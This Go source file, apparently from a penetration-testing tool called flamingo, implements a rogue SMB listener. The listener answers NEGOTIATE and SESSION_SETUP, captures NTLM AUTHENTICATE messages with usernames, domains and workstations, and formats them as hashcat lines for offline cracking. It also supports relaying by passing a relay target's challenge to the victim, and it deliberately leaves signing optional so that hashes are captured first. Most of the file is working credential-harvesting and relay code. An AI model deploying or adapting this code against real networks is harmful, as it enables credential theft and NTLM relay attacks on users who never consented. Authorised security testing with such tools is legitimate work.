package flamingo

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"uuid"

	"github.com/hirochachacha/go-smb2/v2/x/wire"
	log "github.com/sirupsen/logrus"
)

// NT status codes used in the SMB responses flamingo sends.
const (
	smbStatusSuccess                = 0x00000000
	smbStatusMoreProcessingRequired = 0xC0000016
	smbStatusLogonFailure           = 0xC000006D
	smbStatusNotSupported           = 0xC00000BB
)

// NetBIOS session service message types. Port 445 (Direct TCP) only ever uses
// the zero session-message type, while port 139 opens with a session request
// that has to be answered before any SMB message is framed.
const (
	nbtSessionMessage   = 0x00
	nbtSessionRequest   = 0x81
	nbtPositiveResponse = 0x82
	nbtNegativeResponse = 0x83
	nbtKeepAlive        = 0x85
)

// Per-connection limits. An SMB capture never serves data, so the whole
// exchange is a handful of small messages: cap the frame size and the number
// of messages so a client cannot pin a goroutine or a buffer indefinitely.
const (
	smbMaxMessage  = 1024 * 1024
	smbMaxMessages = 16
	smbTimeout     = 30 * time.Second
)

// smbMaxBuffer is the transact/read/write size advertised in NEGOTIATE. It is
// well under smbMaxMessage because no payload is ever exchanged.
const smbMaxBuffer = 64 * 1024

// ConfSMB holds the configuration for an SMB capture server.
type ConfSMB struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter

	// Responder decides the challenge a client is answered with and whether
	// it is told the logon succeeded. Nil — the default — is capture only:
	// flamingo's own fixed challenge and always STATUS_LOGON_FAILURE. A
	// relay responder makes this listener forward to a target instead.
	Responder NTLMResponder

	serverGUID uuid.UUID
	shutdown   bool
	listener   net.Listener
	m          sync.Mutex
}

// NewConfSMB creates a default configuration for the SMB capture server.
func NewConfSMB() *ConfSMB {
	return &ConfSMB{
		BindPort:   445,
		BindHost:   "[::]",
		serverGUID: uuid.New(),
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfSMB) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfSMB) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()
	if !c.shutdown {
		c.shutdown = true
		if c.listener != nil {
			c.listener.Close()
		}
	}
}

// SpawnSMB starts a logging SMB server. Port 445 speaks Direct TCP framing;
// port 139 prefixes it with the NetBIOS session service, which this server
// answers either way.
func SpawnSMB(c *ConfSMB) error {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", c.BindHost, c.BindPort))
	if err != nil {
		return err
	}
	log.Debugf("smb is listening on %s:%d", c.BindHost, c.BindPort)
	c.listener = listener
	go smbStart(c)
	return nil
}

func smbStart(c *ConfSMB) {
	for !c.IsShutdown() {
		conn, err := c.listener.Accept()
		if err != nil {
			continue
		}
		go smbHandleConnection(c, conn)
	}
}

// smbSession is the state of a single SMB connection.
type smbSession struct {
	conf *ConfSMB
	conn net.Conn

	// dialect is the negotiated dialect in dotted form ("3.1.1"), or the
	// SMB1 dialect name when the client never moved to SMB2.
	dialect string

	// clientFlags and clientVersion come from the NTLMSSP NEGOTIATE message.
	clientFlags   uint32
	clientVersion string

	// exchange is this connection's NTLM exchange as handed to the
	// responder, and challenge the CHALLENGE message the client was
	// answered with. For a relayed exchange that challenge is the target's,
	// not flamingo's, which is what the hashcat line is formatted against.
	exchange  *NTLMExchange
	challenge []byte

	// callingName is the NetBIOS calling name from a port 139 session
	// request, used as the workstation when the client supplies none.
	callingName string

	// sessionID is the SMB2 session identifier handed out at the first
	// SESSION_SETUP, and smb1UID its SMB1 equivalent.
	sessionID uint64
	smb1UID   uint16
}

// smbHandleConnection runs the NEGOTIATE and SESSION_SETUP exchange for one
// client, recording the NTLMSSP AUTHENTICATE message and refusing the logon.
func smbHandleConnection(c *ConfSMB, conn net.Conn) {
	defer conn.Close()

	// One deadline for the whole exchange, not one per message: a client
	// cannot keep a goroutine alive by trickling frames.
	conn.SetDeadline(time.Now().Add(smbTimeout))

	s := &smbSession{conf: c, conn: conn, sessionID: 0x1001, smb1UID: 0x0801}
	for i := 0; i < smbMaxMessages; i++ {
		typ, pkt, err := smbReadFrame(conn)
		if err != nil {
			return
		}
		switch typ {
		case nbtSessionRequest:
			// Port 139: the NetBIOS session service has to be accepted
			// before SMB framing starts. The calling name is the client's
			// own NetBIOS name, which is worth keeping.
			s.callingName = smbNBTCallingName(pkt)
			if smbWriteFrame(conn, nbtPositiveResponse, nil) != nil {
				return
			}
			continue
		case nbtKeepAlive:
			continue
		case nbtSessionMessage:
		default:
			log.Debugf("smb unexpected NetBIOS message type 0x%02x from %s", typ, conn.RemoteAddr())
			return
		}
		if !s.handle(pkt) {
			return
		}
	}
}

// handle dispatches one SMB message and reports whether the connection should
// stay open.
func (s *smbSession) handle(pkt []byte) bool {
	if smb1IsHeader(pkt) {
		return s.handleSMB1(pkt)
	}

	p := wire.PacketCodec(pkt)
	if p.IsInvalidRequest() {
		log.Debugf("smb invalid request from %s", s.conn.RemoteAddr())
		return false
	}
	switch p.Command() {
	case wire.SMB2_NEGOTIATE:
		return s.negotiate(p)
	case wire.SMB2_SESSION_SETUP:
		return s.sessionSetup(p)
	default:
		// Nothing past authentication is served: this is a capture-only
		// listener, not a file server.
		log.Debugf("smb command %d from %s after auth, closing", p.Command(), s.conn.RemoteAddr())
		s.write(smbErrorResponse(p, s.sessionID, smbStatusNotSupported))
		return false
	}
}

// negotiate selects the highest dialect the client offered and answers it.
func (s *smbSession) negotiate(p wire.PacketCodec) bool {
	req := wire.NegotiateRequestDecoder(p.Body())
	if req.IsInvalid() {
		log.Debugf("smb invalid NEGOTIATE from %s", s.conn.RemoteAddr())
		return false
	}
	best := smbPickDialect(req.Dialects())
	if best == 0 {
		log.Debugf("smb no supported dialect from %s", s.conn.RemoteAddr())
		s.write(smbErrorResponse(p, s.sessionID, smbStatusNotSupported))
		return false
	}
	s.dialect = smbDialectName(best)
	return s.write(smbNegotiateResponse(s.conf.serverGUID, p.MessageId(), best))
}

// sessionSetup answers the NTLMSSP NEGOTIATE with flamingo's fixed-challenge
// CHALLENGE and records the AUTHENTICATE that follows, then refuses the logon.
func (s *smbSession) sessionSetup(p wire.PacketCodec) bool {
	req := wire.SessionSetupRequestDecoder(p.Body())
	if req.IsInvalid() {
		log.Debugf("smb invalid SESSION_SETUP from %s", s.conn.RemoteAddr())
		return false
	}
	msg := FindNTLMSSP(req.SecurityBuffer())
	if msg == nil {
		// Kerberos-only or anonymous: nothing to capture.
		log.Debugf("smb SESSION_SETUP without NTLMSSP from %s", s.conn.RemoteAddr())
		s.write(smbErrorResponse(p, s.sessionID, smbStatusLogonFailure))
		return false
	}

	switch NTLMMessageType(msg) {
	case NTLMTypeNegotiate:
		s.clientFlags, s.clientVersion = ParseNTLMNegotiate(msg)
		challenge, ok := s.challengeFor(msg)
		if !ok {
			return false
		}
		s.challenge = challenge
		resp := &wire.SessionSetupResponse{
			SecurityBuffer: smbSPNEGONegTokenResp(challenge),
		}
		resp.Status = smbStatusMoreProcessingRequired
		resp.Flags = wire.SMB2_FLAGS_SERVER_TO_REDIR
		resp.MessageId = p.MessageId()
		resp.SessionId = s.sessionID
		resp.CreditRequestResponse = 1
		return s.write(smbEncode(resp))

	case NTLMTypeAuthenticate:
		auth, err := ParseNTLMAuthenticate(msg)
		if err != nil {
			log.Debugf("smb AUTHENTICATE from %s: %s", s.conn.RemoteAddr(), err)
			return false
		}
		s.recordAuth(auth)
		// The credential is recorded before the outcome is decided, so a
		// relay that fails has still handed us the hash.
		resp := &wire.SessionSetupResponse{}
		resp.Status = smbStatusLogonFailure
		if s.authenticated(auth, msg) {
			// The relay target accepted this logon, so the client is told
			// the truth. Nothing past authentication is served either way:
			// the connection closes below.
			resp.Status = smbStatusSuccess
		}
		resp.Flags = wire.SMB2_FLAGS_SERVER_TO_REDIR
		resp.MessageId = p.MessageId()
		resp.SessionId = s.sessionID
		resp.CreditRequestResponse = 1
		s.write(smbEncode(resp))
		return false
	}

	log.Debugf("smb unexpected NTLMSSP message type %d from %s", NTLMMessageType(msg), s.conn.RemoteAddr())
	return false
}

// challengeFor returns the CHALLENGE message to answer an NTLMSSP NEGOTIATE
// with, and reports whether the exchange should continue.
//
// This is the one place the capture path decides what challenge a client
// sees, and so the one place relaying substitutes itself. With no responder
// configured it is flamingo's own fixed challenge, exactly as before; with a
// relay responder it is the relay target's own challenge, which is what makes
// the client's response usable against that target.
func (s *smbSession) challengeFor(negotiate []byte) ([]byte, bool) {
	responder := s.conf.Responder
	if responder == nil {
		return NTLMChallengeMessage(s.clientFlags), true
	}

	s.exchange = &NTLMExchange{
		Proto:         "smb",
		ServerAddr:    s.serverAddr(),
		RemoteAddr:    s.conn.RemoteAddr().String(),
		Type1:         negotiate,
		Flags:         s.clientFlags,
		ClientVersion: s.clientVersion,
		Conn:          s.conn,
	}
	challenge, err := responder.Challenge(s.exchange)
	if err != nil {
		log.Debugf("smb no challenge for %s: %s", s.conn.RemoteAddr(), err)
		return nil, false
	}
	s.exchange.Type2 = challenge
	return challenge, true
}

// authenticated asks the responder whether the client should be told the
// logon succeeded. Capture-only always refuses.
func (s *smbSession) authenticated(a *NTLMAuth, type3 []byte) bool {
	if s.conf.Responder == nil || s.exchange == nil {
		return false
	}
	return s.conf.Responder.Authenticate(s.exchange, a, type3)
}

// serverAddr is the listen address as it appears in records.
func (s *smbSession) serverAddr() string {
	return fmt.Sprintf("%s:%d", s.conf.BindHost, s.conf.BindPort)
}

// recordAuth writes a captured AUTHENTICATE message to the record writer.
func (s *smbSession) recordAuth(a *NTLMAuth) {
	workstation := a.Workstation
	if workstation == "" {
		workstation = s.callingName
	}
	fields := map[string]string{
		"_server":      s.serverAddr(),
		"username":     a.User,
		"domain":       a.Domain,
		"workstation":  workstation,
		"ntlm_version": a.NTLMVersion(),
		"dialect":      s.dialect,
	}
	// Formatted against the challenge this client was actually answered
	// with, which is flamingo's own unless the exchange was relayed.
	if line, mode := NTLMHashcatChallenge(a, NTLMServerChallenge(s.challenge)); line != "" {
		fields["hashcat"] = line
		fields["hashcat_mode"] = strconv.Itoa(mode)
	}
	version := a.Version
	if version == "" {
		version = s.clientVersion
	}
	if version != "" {
		fields["client_version"] = version
	}
	s.conf.RecordWriter.Record("credential", "smb", s.conn.RemoteAddr().String(), fields)
}

// write sends one SMB message in a session-message frame.
func (s *smbSession) write(pkt []byte) bool {
	return smbWriteFrame(s.conn, nbtSessionMessage, pkt) == nil
}

// smbEncode serialises a wire packet.
func smbEncode(p wire.Packet) []byte {
	buf := make([]byte, p.Size())
	p.Encode(buf)
	return buf
}

// smbErrorResponse builds an SMB2 error response for the given request.
func smbErrorResponse(p wire.PacketCodec, sessionID uint64, status uint32) []byte {
	resp := &wire.ErrorResponse{CommandCode: p.Command()}
	resp.Status = status
	resp.Flags = wire.SMB2_FLAGS_SERVER_TO_REDIR
	resp.MessageId = p.MessageId()
	resp.SessionId = sessionID
	resp.CreditRequestResponse = 1
	return smbEncode(resp)
}

// smbSupportedDialects are the SMB2 dialects this listener answers, lowest
// first. 0x02ff (the wildcard) is only ever sent in reply to an SMB1
// multi-protocol NEGOTIATE, never selected here.
var smbSupportedDialects = []uint16{wire.SMB202, wire.SMB210, wire.SMB300, wire.SMB302, wire.SMB311}

// smbPickDialect returns the highest supported dialect in the client's list,
// or zero when it offered none.
func smbPickDialect(offered []wire.Dialect) uint16 {
	var best uint16
	for _, d := range offered {
		for _, sup := range smbSupportedDialects {
			if uint16(d) == sup && sup > best {
				best = sup
			}
		}
	}
	return best
}

// smbDialectName renders a dialect revision in the dotted form used in
// records and in Windows documentation.
func smbDialectName(d uint16) string {
	switch d {
	case wire.SMB202:
		return "2.0.2"
	case wire.SMB210:
		return "2.1"
	case wire.SMB300:
		return "3.0"
	case wire.SMB302:
		return "3.0.2"
	case wire.SMB311:
		return "3.1.1"
	case smb1WildcardDialect:
		return "2.???"
	}
	return fmt.Sprintf("0x%04x", d)
}

// smbNegotiateResponse builds a NEGOTIATE response selecting dialect, adding
// the SMB 3.1.1 preauth-integrity and encryption negotiate contexts when that
// dialect was chosen.
//
// SecurityMode advertises SMB2_NEGOTIATE_SIGNING_ENABLED and never
// SMB2_NEGOTIATE_SIGNING_REQUIRED, and signatures are left zero. This is
// deliberate and must stay that way: a client configured to require signing
// still completes NEGOTIATE and SESSION_SETUP and only drops the session
// afterwards, so the AUTHENTICATE message — the only thing this listener
// wants — has already been captured. Advertising SIGNING_REQUIRED would buy
// nothing, since no session key exists to sign with.
func smbNegotiateResponse(guid uuid.UUID, messageID uint64, dialect uint16) []byte {
	resp := &wire.NegotiateResponse{
		SecurityMode:    wire.SMB2_NEGOTIATE_SIGNING_ENABLED,
		DialectRevision: dialect,
		ServerGuid:      guid,
		Capabilities:    wire.SMB2_GLOBAL_CAP_DFS | wire.SMB2_GLOBAL_CAP_LARGE_MTU,
		MaxTransactSize: smbMaxBuffer,
		MaxReadSize:     smbMaxBuffer,
		MaxWriteSize:    smbMaxBuffer,
		SystemTime:      smbNow(),
		SecurityBuffer:  smbSPNEGONegTokenInit2(),
	}
	if dialect == wire.SMB311 {
		salt := make([]byte, 32)
		rand.Read(salt)
		resp.Contexts = wire.NegotiateContexts{
			&wire.HashContext{HashAlgorithms: []uint16{wire.SHA512}, HashSalt: salt},
			&wire.CipherContext{Ciphers: []wire.Cipher{wire.AES128GCM}},
		}
	}
	resp.Status = smbStatusSuccess
	resp.Flags = wire.SMB2_FLAGS_SERVER_TO_REDIR
	resp.MessageId = messageID
	resp.CreditRequestResponse = 1
	return smbEncode(resp)
}

// smbNow is the current time as an SMB FILETIME.
func smbNow() wire.Filetime {
	ft, _ := wire.TimeToFiletime(time.Now())
	return ft
}

// smbReadFrame reads one NetBIOS session service frame and returns its message
// type with the payload.
func smbReadFrame(conn net.Conn) (byte, []byte, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return 0, nil, err
	}
	n := int(binary.BigEndian.Uint32(hdr[:]) & 0x00ffffff)
	if n > smbMaxMessage {
		return hdr[0], nil, fmt.Errorf("oversized frame of %d bytes", n)
	}
	if n == 0 {
		return hdr[0], nil, nil
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return hdr[0], nil, err
	}
	return hdr[0], buf, nil
}

// smbWriteFrame writes one NetBIOS session service frame.
func smbWriteFrame(conn net.Conn, typ byte, payload []byte) error {
	if len(payload) > smbMaxMessage {
		return fmt.Errorf("oversized frame of %d bytes", len(payload))
	}
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(payload)))
	hdr[0] = typ
	_, err := conn.Write(append(hdr, payload...))
	return err
}

// smbNBTCallingName decodes the calling name of a NetBIOS session request.
// The payload holds the called name followed by the calling name, each a
// length byte, 32 first-level-encoded characters and a scope terminator.
func smbNBTCallingName(pkt []byte) string {
	if len(pkt) < 68 || pkt[0] != 32 || pkt[34] != 32 {
		return ""
	}
	name := make([]byte, 0, 16)
	for i := 0; i < 32; i += 2 {
		hi, lo := pkt[35+i], pkt[36+i]
		if hi < 'A' || hi > 'P' || lo < 'A' || lo > 'P' {
			return ""
		}
		name = append(name, (hi-'A')<<4|(lo-'A'))
	}
	// The sixteenth byte is the NetBIOS suffix, not part of the name.
	return strings.TrimRight(string(name[:15]), " \x00")
}

// --- minimal SPNEGO ---------------------------------------------------------
//
// go-smb2's x/protocol has a SPNEGO implementation, but it is unexported and
// importing that package drags in quic-go and lz4, so the two tokens this
// listener needs are built here.

// smbMechNTLMSSP is the NTLMSSP mechanism OID 1.3.6.1.4.1.311.2.2.10.
var smbMechNTLMSSP = []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

// smbOIDSPNEGO is the SPNEGO OID 1.3.6.1.5.5.2.
var smbOIDSPNEGO = []byte{0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}

// smbSPNEGONegTokenInit2 is the NEGOTIATE security buffer, advertising
// NTLMSSP as the only mechanism so clients do not try Kerberos first.
func smbSPNEGONegTokenInit2() []byte {
	mechTypes := smbDER(0x30, smbDER(0x06, smbMechNTLMSSP))
	negTokenInit := smbDER(0x30, smbDER(0xa0, mechTypes))
	inner := append(smbDER(0x06, smbOIDSPNEGO), smbDER(0xa0, negTokenInit)...)
	return smbDER(0x60, inner)
}

// smbSPNEGONegTokenResp wraps an NTLMSSP message in a negTokenResp carrying
// the accept-incomplete result.
func smbSPNEGONegTokenResp(token []byte) []byte {
	body := smbDER(0xa0, smbDER(0x0a, []byte{0x01})) // negResult: accept-incomplete
	body = append(body, smbDER(0xa1, smbDER(0x06, smbMechNTLMSSP))...)
	body = append(body, smbDER(0xa2, smbDER(0x04, token))...)
	return smbDER(0xa1, smbDER(0x30, body))
}

// smbDER wraps content in a DER tag-length-value triple.
func smbDER(tag byte, content []byte) []byte {
	out := []byte{tag}
	n := len(content)
	switch {
	case n < 0x80:
		out = append(out, byte(n))
	case n < 0x100:
		out = append(out, 0x81, byte(n))
	default:
		out = append(out, 0x82, byte(n>>8), byte(n))
	}
	return append(out, content...)
}
